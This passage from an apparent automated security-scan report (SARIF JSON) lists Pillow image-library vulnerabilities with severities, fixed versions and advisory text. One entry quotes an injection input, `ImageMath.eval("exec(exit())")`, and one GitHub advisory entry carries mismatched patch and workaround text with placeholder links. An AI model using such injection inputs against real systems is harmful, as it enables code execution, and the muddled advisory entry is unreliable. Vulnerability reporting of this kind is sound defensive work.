                "text": "Vulnerability CVE-2020-10379\nSeverity: high\nFixed Version: 7.1.0\nLink: [CVE-2020-10379](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10379)\nIn Pillow before 7.1.0, there are two Buffer Overflows in `libImaging/TiffDecode.c`.",
                "markdown": "**Vulnerability CVE-2020-10379**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|7.1.0|[CVE-2020-10379](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10379)|\n\nIn Pillow before 7.1.0, there are two Buffer Overflows in `libImaging/TiffDecode.c`."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-35655",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-35655"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35655",
              "help": {
                "text": "Vulnerability CVE-2020-35655\nSeverity: medium\nFixed Version: 8.1.0\nLink: [CVE-2020-35655](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35655)\nIn Pillow before 8.1.0, SGIRleDecode has a 4-byte buffer over-read when decoding crafted SGI RLE image files because offsets and length tables are mishandled.",
                "markdown": "**Vulnerability CVE-2020-35655**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|8.1.0|[CVE-2020-35655](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35655)|\n\nIn Pillow before 8.1.0, SGIRleDecode has a 4-byte buffer over-read when decoding crafted SGI RLE image files because offsets and length tables are mishandled."
              },
              "properties": {
                "security-severity": "5.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-35653",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-35653"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35653",
              "help": {
                "text": "Vulnerability CVE-2020-35653\nSeverity: high\nFixed Version: 8.1.0\nLink: [CVE-2020-35653](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35653)\nIn Pillow before 8.1.0, PcxDecode has a buffer over-read when decoding a crafted PCX file because the user-supplied stride value is trusted for buffer calculations.",
                "markdown": "**Vulnerability CVE-2020-35653**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.1.0|[CVE-2020-35653](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35653)|\n\nIn Pillow before 8.1.0, PcxDecode has a buffer over-read when decoding a crafted PCX file because the user-supplied stride value is trusted for buffer calculations."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-35654",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-35654"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35654",
              "help": {
                "text": "Vulnerability CVE-2020-35654\nSeverity: high\nFixed Version: 8.1.0\nLink: [CVE-2020-35654](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35654)\nIn Pillow before 8.1.0, TiffDecode has a heap-based buffer overflow when decoding crafted YCbCr files because of certain interpretation conflicts with LibTIFF in RGBA mode.",
                "markdown": "**Vulnerability CVE-2020-35654**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.1.0|[CVE-2020-35654](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35654)|\n\nIn Pillow before 8.1.0, TiffDecode has a heap-based buffer overflow when decoding crafted YCbCr files because of certain interpretation conflicts with LibTIFF in RGBA mode."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-25289",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-25289"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25289",
              "help": {
                "text": "Vulnerability CVE-2021-25289\nSeverity: critical\nFixed Version: 8.1.1\nLink: [CVE-2021-25289](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25289)\nAn issue was discovered in Pillow before 8.1.1. TiffDecode has a heap-based buffer overflow when decoding crafted YCbCr files because of certain interpretation conflicts with LibTIFF in RGBA mode. NOTE: this issue exists because of an incomplete fix for CVE-2020-35654.",
                "markdown": "**Vulnerability CVE-2021-25289**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|8.1.1|[CVE-2021-25289](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25289)|\n\nAn issue was discovered in Pillow before 8.1.1. TiffDecode has a heap-based buffer overflow when decoding crafted YCbCr files because of certain interpretation conflicts with LibTIFF in RGBA mode. NOTE: this issue exists because of an incomplete fix for CVE-2020-35654."
              },
              "properties": {
                "security-severity": "9.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2021-27921",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-27921"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27921",
              "help": {
                "text": "Vulnerability CVE-2021-27921\nSeverity: high\nFixed Version: 8.1.1\nLink: [CVE-2021-27921](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27921)\nPillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large.",
                "markdown": "**Vulnerability CVE-2021-27921**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.1.1|[CVE-2021-27921](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27921)|\n\nPillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-25293",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-25293"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25293",
              "help": {
                "text": "Vulnerability CVE-2021-25293\nSeverity: high\nFixed Version: 8.1.1\nLink: [CVE-2021-25293](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25293)\nAn issue was discovered in Pillow before 8.1.1. There is an out-of-bounds read in SGIRleDecode.c.",
                "markdown": "**Vulnerability CVE-2021-25293**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.1.1|[CVE-2021-25293](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25293)|\n\nAn issue was discovered in Pillow before 8.1.1. There is an out-of-bounds read in SGIRleDecode.c."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-25290",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-25290"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25290",
              "help": {
                "text": "Vulnerability CVE-2021-25290\nSeverity: high\nFixed Version: 8.1.1\nLink: [CVE-2021-25290](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25290)\nAn issue was discovered in Pillow before 8.1.1. In TiffDecode.c, there is a negative-offset memcpy with an invalid size.",
                "markdown": "**Vulnerability CVE-2021-25290**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.1.1|[CVE-2021-25290](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25290)|\n\nAn issue was discovered in Pillow before 8.1.1. In TiffDecode.c, there is a negative-offset memcpy with an invalid size."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "GHSA-jgpv-4h4c-xhw3",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "GHSA-jgpv-4h4c-xhw3"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://github.com/advisories/GHSA-jgpv-4h4c-xhw3",
              "help": {
                "text": "Vulnerability GHSA-jgpv-4h4c-xhw3\nSeverity: medium\nFixed Version: 8.1.2\nLink: [GHSA-jgpv-4h4c-xhw3](https://github.com/advisories/GHSA-jgpv-4h4c-xhw3)\n### Impact\n_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._\n\n### Patches\n_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._\n\n### Workarounds\n_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-27921\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [example link to repo](http://example.com)\n* Email us at [example email address](mailto:example@example.com)",
                "markdown": "**Vulnerability GHSA-jgpv-4h4c-xhw3**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|8.1.2|[GHSA-jgpv-4h4c-xhw3](https://github.com/advisories/GHSA-jgpv-4h4c-xhw3)|\n\n### Impact\n_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._\n\n### Patches\n_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._\n\n### Workarounds\n_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-27921\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [example link to repo](http://example.com)\n* Email us at [example email address](mailto:example@example.com)"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-25292",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-25292"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25292",
              "help": {
                "text": "Vulnerability CVE-2021-25292\nSeverity: medium\nFixed Version: 8.1.1\nLink: [CVE-2021-25292](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25292)\nAn issue was discovered in Pillow before 8.1.1. The PDF parser allows a regular expression DoS (ReDoS) attack via a crafted PDF file because of a catastrophic backtracking regex.",
                "markdown": "**Vulnerability CVE-2021-25292**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|8.1.1|[CVE-2021-25292](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25292)|\n\nAn issue was discovered in Pillow before 8.1.1. The PDF parser allows a regular expression DoS (ReDoS) attack via a crafted PDF file because of a catastrophic backtracking regex."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-27922",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-27922"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27922",
              "help": {
                "text": "Vulnerability CVE-2021-27922\nSeverity: high\nFixed Version: 8.1.1\nLink: [CVE-2021-27922](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27922)\nPillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for an ICNS container, and thus an attempted memory allocation can be very large.",
                "markdown": "**Vulnerability CVE-2021-27922**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.1.1|[CVE-2021-27922](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27922)|\n\nPillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for an ICNS container, and thus an attempted memory allocation can be very large."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-27923",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-27923"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27923",
              "help": {
                "text": "Vulnerability CVE-2021-27923\nSeverity: high\nFixed Version: 8.1.1\nLink: [CVE-2021-27923](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27923)\nPillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for an ICO container, and thus an attempted memory allocation can be very large.",
                "markdown": "**Vulnerability CVE-2021-27923**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.1.1|[CVE-2021-27923](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27923)|\n\nPillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for an ICO container, and thus an attempted memory allocation can be very large."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-25291",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-25291"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25291",
              "help": {
                "text": "Vulnerability CVE-2021-25291\nSeverity: high\nFixed Version: 8.2.0\nLink: [CVE-2021-25291](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25291)\nAn issue was discovered in Pillow before 8.2.0. In `TiffDecode.c`, there is an out-of-bounds read in `TiffreadRGBATile` via invalid tile boundaries.",
                "markdown": "**Vulnerability CVE-2021-25291**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.2.0|[CVE-2021-25291](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25291)|\n\nAn issue was discovered in Pillow before 8.2.0. In `TiffDecode.c`, there is an out-of-bounds read in `TiffreadRGBATile` via invalid tile boundaries."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-25288",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-25288"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25288",
              "help": {
                "text": "Vulnerability CVE-2021-25288\nSeverity: high\nFixed Version: 8.2.0\nLink: [CVE-2021-25288](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25288)\nAn issue was discovered in Pillow before 8.2.0. There is an out-of-bounds read in J2kDecode, in j2ku_gray_i. This dates to Pillow 2.4.0.",
                "markdown": "**Vulnerability CVE-2021-25288**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.2.0|[CVE-2021-25288](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25288)|\n\nAn issue was discovered in Pillow before 8.2.0. There is an out-of-bounds read in J2kDecode, in j2ku_gray_i. This dates to Pillow 2.4.0."
              },
              "properties": {
                "security-severity": "9.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-28678",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-28678"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28678",
              "help": {
                "text": "Vulnerability CVE-2021-28678\nSeverity: medium\nFixed Version: 8.2.0\nLink: [CVE-2021-28678](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28678)\nAn issue was discovered in Pillow before 8.2.0. For BLP data, BlpImagePlugin did not properly check that reads (after jumping to file offsets) returned data. This could lead to a DoS where the decoder could be run a large number of times on empty data.",
                "markdown": "**Vulnerability CVE-2021-28678**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|8.2.0|[CVE-2021-28678](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28678)|\n\nAn issue was discovered in Pillow before 8.2.0. For BLP data, BlpImagePlugin did not properly check that reads (after jumping to file offsets) returned data. This could lead to a DoS where the decoder could be run a large number of times on empty data."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-28675",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-28675"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28675",
              "help": {
                "text": "Vulnerability CVE-2021-28675\nSeverity: high\nFixed Version: 8.2.0\nLink: [CVE-2021-28675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28675)\nAn issue was discovered in Pillow before 8.2.0. `PSDImagePlugin.PsdImageFile` lacked a sanity check on the number of input layers relative to the size of the data block. This could lead to a DoS on `Image.open` prior to `Image.load`.",
                "markdown": "**Vulnerability CVE-2021-28675**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.2.0|[CVE-2021-28675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28675)|\n\nAn issue was discovered in Pillow before 8.2.0. `PSDImagePlugin.PsdImageFile` lacked a sanity check on the number of input layers relative to the size of the data block. This could lead to a DoS on `Image.open` prior to `Image.load`."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-28676",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-28676"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28676",
              "help": {
                "text": "Vulnerability CVE-2021-28676\nSeverity: high\nFixed Version: 8.2.0\nLink: [CVE-2021-28676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28676)\nAn issue was discovered in Pillow before 8.2.0. For FLI data, FliDecode did not properly check that the block advance was non-zero, potentially leading to an infinite loop on load.",
                "markdown": "**Vulnerability CVE-2021-28676**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.2.0|[CVE-2021-28676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28676)|\n\nAn issue was discovered in Pillow before 8.2.0. For FLI data, FliDecode did not properly check that the block advance was non-zero, potentially leading to an infinite loop on load."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-25287",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-25287"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25287",
              "help": {
                "text": "Vulnerability CVE-2021-25287\nSeverity: high\nFixed Version: 8.2.0\nLink: [CVE-2021-25287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25287)\nAn issue was discovered in Pillow before 8.2.0. There is an out-of-bounds read in J2kDecode, in j2ku_graya_la.",
                "markdown": "**Vulnerability CVE-2021-25287**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.2.0|[CVE-2021-25287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25287)|\n\nAn issue was discovered in Pillow before 8.2.0. There is an out-of-bounds read in J2kDecode, in j2ku_graya_la."
              },
              "properties": {
                "security-severity": "9.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-28677",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-28677"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28677",
              "help": {
                "text": "Vulnerability CVE-2021-28677\nSeverity: high\nFixed Version: 8.2.0\nLink: [CVE-2021-28677](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28677)\nAn issue was discovered in Pillow before 8.2.0. For EPS data, the readline implementation used in EPSImageFile has to deal with any combination of \\r and \n as line endings. It used an accidentally quadratic method of accumulating lines while looking for a line ending. A malicious EPS file could use this to perform a DoS of Pillow in the open phase, before an image was accepted for opening.",
                "markdown": "**Vulnerability CVE-2021-28677**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.2.0|[CVE-2021-28677](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28677)|\n\nAn issue was discovered in Pillow before 8.2.0. For EPS data, the readline implementation used in EPSImageFile has to deal with any combination of \\r and \n as line endings. It used an accidentally quadratic method of accumulating lines while looking for a line ending. A malicious EPS file could use this to perform a DoS of Pillow in the open phase, before an image was accepted for opening."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-34552",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-34552"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34552",
              "help": {
                "text": "Vulnerability CVE-2021-34552\nSeverity: critical\nFixed Version: 8.3.0\nLink: [CVE-2021-34552](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34552)\nPillow through 8.2.0 and PIL (aka Python Imaging Library) through 1.1.7 allow an attacker to pass controlled parameters directly into a convert function to trigger a buffer overflow in Convert.c.",
                "markdown": "**Vulnerability CVE-2021-34552**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|8.3.0|[CVE-2021-34552](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34552)|\n\nPillow through 8.2.0 and PIL (aka Python Imaging Library) through 1.1.7 allow an attacker to pass controlled parameters directly into a convert function to trigger a buffer overflow in Convert.c."
              },
              "properties": {
                "security-severity": "9.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2021-23437",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-23437"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23437",
              "help": {
                "text": "Vulnerability CVE-2021-23437\nSeverity: high\nFixed Version: 8.3.2\nLink: [CVE-2021-23437](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23437)\nThe package pillow 5.2.0 and before 8.3.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the getrgb function.",
                "markdown": "**Vulnerability CVE-2021-23437**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|8.3.2|[CVE-2021-23437](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23437)|\n\nThe package pillow 5.2.0 and before 8.3.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the getrgb function."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-22816",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-22816"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22816",
              "help": {
                "text": "Vulnerability CVE-2022-22816\nSeverity: medium\nFixed Version: 9.0.0\nLink: [CVE-2022-22816](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22816)\npath_getbbox in path.c in Pillow before 9.0.0 has a buffer over-read during initialization of ImagePath.Path.",
                "markdown": "**Vulnerability CVE-2022-22816**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|9.0.0|[CVE-2022-22816](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22816)|\n\npath_getbbox in path.c in Pillow before 9.0.0 has a buffer over-read during initialization of ImagePath.Path."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-22815",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-22815"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22815",
              "help": {
                "text": "Vulnerability CVE-2022-22815\nSeverity: medium\nFixed Version: 9.0.0\nLink: [CVE-2022-22815](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22815)\nPillow is the friendly PIL (Python Imaging Library) fork. `path_getbbox` in `path.c` in Pillow before 9.0.0 improperly initializes `ImagePath.Path`.",
                "markdown": "**Vulnerability CVE-2022-22815**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|9.0.0|[CVE-2022-22815](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22815)|\n\nPillow is the friendly PIL (Python Imaging Library) fork. `path_getbbox` in `path.c` in Pillow before 9.0.0 improperly initializes `ImagePath.Path`."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "GHSA-4fx9-vc88-q2xc",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "GHSA-4fx9-vc88-q2xc"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://github.com/advisories/GHSA-4fx9-vc88-q2xc",
              "help": {
                "text": "Vulnerability GHSA-4fx9-vc88-q2xc\nSeverity: low\nFixed Version: 9.0.0\nLink: [GHSA-4fx9-vc88-q2xc](https://github.com/advisories/GHSA-4fx9-vc88-q2xc)\nJpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.\n\nIf the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",
                "markdown": "**Vulnerability GHSA-4fx9-vc88-q2xc**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|9.0.0|[GHSA-4fx9-vc88-q2xc](https://github.com/advisories/GHSA-4fx9-vc88-q2xc)|\n\nJpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.\n\nIf the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file."
              },
              "properties": {
                "security-severity": "2.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2022-22817",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-22817"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22817",
              "help": {
                "text": "Vulnerability CVE-2022-22817\nSeverity: critical\nFixed Version: 9.0.1\nLink: [CVE-2022-22817](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22817)\n`PIL.ImageMath.eval` in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method `ImageMath.eval(\"exec(exit())\")`.\n\nWhile Pillow 9.0.0 restricted top-level builtins available to PIL.ImageMath.eval(), it did not prevent builtins available to lambda expressions. These are now also restricted in 9.0.1.",
                "markdown": "**Vulnerability CVE-2022-22817**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|9.0.1|[CVE-2022-22817](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22817)|\n\n`PIL.ImageMath.eval` in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method `ImageMath.eval(\"exec(exit())\")`.\n\nWhile Pillow 9.0.0 restricted top-level builtins available to PIL.ImageMath.eval(), it did not prevent builtins available to lambda expressions. These are now also restricted in 9.0.1."
              },
              "properties": {
                "security-severity": "9.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2022-24303",
